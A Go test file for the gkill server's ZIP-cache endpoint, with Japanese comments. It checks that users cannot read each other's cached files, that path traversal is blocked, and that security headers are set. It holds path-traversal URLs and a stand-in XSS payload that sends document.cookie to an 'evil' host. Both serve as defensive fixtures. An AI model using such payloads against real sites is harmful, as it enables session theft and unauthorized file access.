package gkill_server_api

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/mt3hr/gkill/src/server/gkill/dao/account"
	"github.com/mt3hr/gkill/src/server/gkill/dao/account_state"
	"github.com/mt3hr/gkill/src/server/gkill/main/common/gkill_options"
)

// addZipCacheTestUser はテスト用のアカウントとログインセッションを直接DAOに作る。
// /api/login を経由しないので、Argon2idの計算を挟まずに済む。
func addZipCacheTestUser(t *testing.T, gkillAPI *GkillServerAPI, userID string) string {
	t.Helper()
	ctx := context.Background()

	existing, err := gkillAPI.GkillDAOManager.ConfigDAOs.AccountDAO.GetAccount(ctx, userID)
	if err != nil {
		t.Fatalf("GetAccount(%s) failed: %v", userID, err)
	}
	if existing == nil {
		newAccount := &account.Account{UserID: userID, IsAdmin: false, IsEnable: true}
		if _, err := gkillAPI.GkillDAOManager.ConfigDAOs.AccountDAO.AddAccount(ctx, newAccount); err != nil {
			t.Fatalf("AddAccount(%s) failed: %v", userID, err)
		}
	}

	device, err := gkillAPI.GetDevice()
	if err != nil {
		t.Fatalf("GetDevice failed: %v", err)
	}
	loginSession := &account_state.LoginSession{
		ID:              GenerateNewID(),
		UserID:          userID,
		Device:          device,
		ApplicationName: "gkill",
		SessionID:       GenerateNewID(),
		ClientIPAddress: "127.0.0.1",
		LoginTime:       time.Now(),
		ExpirationTime:  time.Now().Add(time.Hour),
		IsLocalAppUser:  true,
	}
	if _, err := gkillAPI.GkillDAOManager.ConfigDAOs.LoginSessionDAO.AddLoginSession(ctx, loginSession); err != nil {
		t.Fatalf("AddLoginSession(%s) failed: %v", userID, err)
	}
	return loginSession.SessionID
}

// writeZipCacheFile は指定ユーザのzipキャッシュ配下にファイルを置き、
// そのファイルを指す /zip_cache/... のパスを返す。
func writeZipCacheFile(t *testing.T, userID string, repName string, hash string, name string, content string) string {
	t.Helper()
	dir := filepath.Join(os.ExpandEnv(gkill_options.CacheDir), "zip_cache", userID, repName, hash)
	if err := os.MkdirAll(dir, os.ModePerm); err != nil {
		t.Fatalf("failed to create zip cache dir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600); err != nil {
		t.Fatalf("failed to write zip cache file: %v", err)
	}
	return "/zip_cache/" + repName + "/" + hash + "/" + name
}

func getZipCache(t *testing.T, ts *httptest.Server, path string, sessionID string) *http.Response {
	t.Helper()
	req, err := http.NewRequest(http.MethodGet, ts.URL+path, nil)
	if err != nil {
		t.Fatalf("NewRequest failed: %v", err)
	}
	if sessionID != "" {
		req.AddCookie(&http.Cookie{Name: "gkill_session_id", Value: sessionID})
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("GET %s failed: %v", path, err)
	}
	return resp
}

// TestZipCacheFileServeIsolatesUsers は、あるユーザのセッションで
// 他のユーザのzipキャッシュを読めないことを確認する。
//
// 以前は caches/zip_cache 直下を起点に配信していたため、ログインできる利用者なら
// 誰でも他人の展開済みZIPを読めた。今は起点をセッションから引いたユーザの
// ディレクトリに固定しているので、URLに他人のパスを書いても届かない。
func TestZipCacheFileServeIsolatesUsers(t *testing.T) {
	gkillAPI, optCleanup := setupTestGkillServerAPI(t)
	defer optCleanup()

	router := gkillAPI.GkillDAOManager.GetRouter()
	router.PathPrefix("/zip_cache/").HandlerFunc(gkillAPI.wrapNoAuth(gkillAPI.HandleZipCacheFileServe))
	ts := httptest.NewServer(router)
	defer ts.Close()

	aliceSession := addZipCacheTestUser(t, gkillAPI, "alice")
	bobSession := addZipCacheTestUser(t, gkillAPI, "bob")

	// 両者とも同じrep名を使う。rep名の照合だけでは分離できないことを踏まえた構成
	const repName = "photos"
	alicePath := writeZipCacheFile(t, "alice", repName, "aaaaaaaa", "secret.txt", "alice's secret")
	bobPath := writeZipCacheFile(t, "bob", repName, "bbbbbbbb", "secret.txt", "bob's secret")

	t.Run("自分のキャッシュは読める", func(t *testing.T) {
		resp := getZipCache(t, ts, alicePath, aliceSession)
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200", resp.StatusCode)
		}
	})

	t.Run("他人のキャッシュは読めない", func(t *testing.T) {
		resp := getZipCache(t, ts, bobPath, aliceSession)
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			t.Errorf("alice が bob のキャッシュを読めてしまった (status = %d)", resp.StatusCode)
		}
	})

	t.Run("bob側からも同様", func(t *testing.T) {
		resp := getZipCache(t, ts, alicePath, bobSession)
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			t.Errorf("bob が alice のキャッシュを読めてしまった (status = %d)", resp.StatusCode)
		}
	})

	t.Run("ユーザで分かれていない場所は配信しない", func(t *testing.T) {
		// 旧実装は caches/zip_cache 直下を起点にしていたので、
		// ユーザ名の階層を挟まないパスがそのまま配信できてしまっていた。
		// 起点をユーザのディレクトリに固定した今は届かないこと
		dir := filepath.Join(os.ExpandEnv(gkill_options.CacheDir), "zip_cache", repName, "cccccccc")
		if err := os.MkdirAll(dir, os.ModePerm); err != nil {
			t.Fatalf("failed to create legacy zip cache dir: %v", err)
		}
		if err := os.WriteFile(filepath.Join(dir, "leak.txt"), []byte("leaked"), 0o600); err != nil {
			t.Fatalf("failed to write legacy zip cache file: %v", err)
		}

		resp := getZipCache(t, ts, "/zip_cache/"+repName+"/cccccccc/leak.txt", aliceSession)
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			t.Error("ユーザごとに分かれていない旧レイアウトのキャッシュが配信されてしまった")
		}
	})

	t.Run("上位ディレクトリ参照で抜けられない", func(t *testing.T) {
		// http.Dir は path.Clean("/"+name) でルート化してからjoinするので抜けられないはず
		for _, path := range []string{
			"/zip_cache/../bob/" + repName + "/bbbbbbbb/secret.txt",
			"/zip_cache/..%2Fbob%2F" + repName + "%2Fbbbbbbbb%2Fsecret.txt",
			"/zip_cache/" + repName + "/../../bob/" + repName + "/bbbbbbbb/secret.txt",
		} {
			resp := getZipCache(t, ts, path, aliceSession)
			body := make([]byte, 64)
			n, _ := resp.Body.Read(body)
			resp.Body.Close()
			if resp.StatusCode == http.StatusOK && string(body[:n]) == "bob's secret" {
				t.Errorf("%s で bob のキャッシュが読めてしまった", path)
			}
		}
	})

	t.Run("セッションが無ければ拒否", func(t *testing.T) {
		resp := getZipCache(t, ts, alicePath, "")
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusForbidden {
			t.Errorf("status = %d, want 403", resp.StatusCode)
		}
	})

	t.Run("知らないセッションIDは拒否", func(t *testing.T) {
		resp := getZipCache(t, ts, alicePath, GenerateNewID())
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusForbidden {
			t.Errorf("status = %d, want 403", resp.StatusCode)
		}
	})
}

// TestZipCacheFileServeSetsSecurityHeaders は、利用者のファイルをそのまま返す経路に
// セキュリティヘッダが付くことを確認する。
//
// この経路は取り込んだZIPの展開物を、拡張子から決めたContent-Typeで
// 同一オリジンから配信する。展開時に拡張子の許可リストは無いので、
// 受け取った .cbz にHTMLが入っていればHTMLとして解釈される。
// セッションクッキーはクライアント側のJSが document.cookie で書いており
// HttpOnly を付けられないため、同一オリジンでスクリプトが動くと読み出せてしまう。
// CSP sandbox は allow-scripts を付けていないので中のJSは実行されない。
//
// ルート登録は serve.go と同じ形にしないとラッパーを通らないので注意。
func TestZipCacheFileServeSetsSecurityHeaders(t *testing.T) {
	gkillAPI, optCleanup := setupTestGkillServerAPI(t)
	defer optCleanup()

	router := gkillAPI.GkillDAOManager.GetRouter()
	router.PathPrefix("/zip_cache/").HandlerFunc(
		withUserContentSecurityHeaders(gkillAPI.wrapNoAuth(gkillAPI.HandleZipCacheFileServe)))
	ts := httptest.NewServer(router)
	defer ts.Close()

	sessionID := addZipCacheTestUser(t, gkillAPI, "carol")
	// ZIPの中身としてHTMLが混じっている状況を作る
	// index.html は http.FileServer がディレクトリへリダイレクトしてしまうので別名にする
	htmlPath := writeZipCacheFile(t, "carol", "comics", "cccccccc", "page.html",
		"<script>fetch('//evil/'+document.cookie)</script>")

	resp := getZipCache(t, ts, htmlPath, sessionID)
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200", resp.StatusCode)
	}
	if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
		t.Errorf("X-Content-Type-Options = %q, want %q", got, "nosniff")
	}
	if got := resp.Header.Get("Content-Security-Policy"); got != "sandbox" {
		t.Errorf("Content-Security-Policy = %q, want %q", got, "sandbox")
	}
}
